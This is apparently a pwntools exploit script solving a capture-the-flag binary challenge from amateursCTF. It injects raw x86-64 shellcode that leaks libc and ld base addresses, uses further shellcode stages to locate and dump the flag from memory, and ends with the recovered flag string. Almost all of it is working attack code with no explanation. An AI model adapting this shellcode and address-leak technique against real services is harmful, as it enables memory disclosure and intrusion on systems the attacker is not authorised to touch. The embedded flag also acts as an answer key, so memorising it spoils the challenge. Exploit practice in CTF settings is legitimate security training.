#!/usr/bin/python3

from pwn import *

exe = ELF('./chal_patched', checksec=False)
# p = process(["gdbserver", "localhost:4001", "chal_patched"])
p = process("./chal_patched")
context.binary = exe
libc =ELF("./libc.so.6")
def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                b* 0x00000000004013bf
                b* 0x0000000000401591
                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('amt.rs', 31173)

# payload = asm('''
        #       mov r15, rax
        #       mov rax, 0x1
        #       mov rdi, 0x1
        #       mov rdx, 0x100
        #       mov rsi, 0x404060
        #       syscall
        #       mov rax, 0x0
        #       mov rdi, 0x0
        #       mov rsi, r15
        #       add rsi, 0x3f
        #       mov rdx, 0x100
        #       syscall
#               ''')
payload = "\x49\x89\xC7\x48\xC7\xC0\x01\x00\x00\x00\x48\xC7\xC7\x01\x00\x00\x00\x48\xC7\xC2\x00\x01\x00\x00\x48\xC7\xC6\x60\x40\x40\x00\x0F\x05\x48\xC7\xC0\x00\x00\x00\x00\x48\xC7\xC7\x00\x00\x00\x00\x4C\x89\xFE\x48\x83\xC6\x3F\x48\xC7\xC2\x00\x01\x00\x00\x0F\x05"

GDB()
sa(b"> ", payload)
libc_leak = u64(p.recv(8))
info("libc leak: "+ hex(libc_leak))
libc.address = libc_leak - libc.sym['open']
info("libc base: " + hex(libc.address))
ld_base = libc.address + 0x254000
info("ld base: " + hex(ld_base))
print(p.recv(248))

payload = asm(f'''
              mov rax, 0x1
              mov rdi, 0x1
              mov rsi, {hex(ld_base + 0x8000*6 - 0x1000)}
              mov rdx, 0x1000
              syscall
              mov rax, 0x0
              mov rdi, 0x0
              mov rsi, r15
              add rsi, 0x81
              mov rdx, 0x100
              syscall
              ''')
s(payload)
flag_addr = u64(p.recv(8))
info("flag addr: "+ hex(flag_addr))
payload = asm(f'''
              mov rax, 0x1
              mov rdi, 0x1
              mov rsi, {hex((flag_addr & 0xFFFFF000)+20148224)}
              mov rdx, 0x100
              syscall
              ''')
s(payload)
p.interactive()
# amateursCTF{3xc3pt10n_suppr3ss10n_ftw}
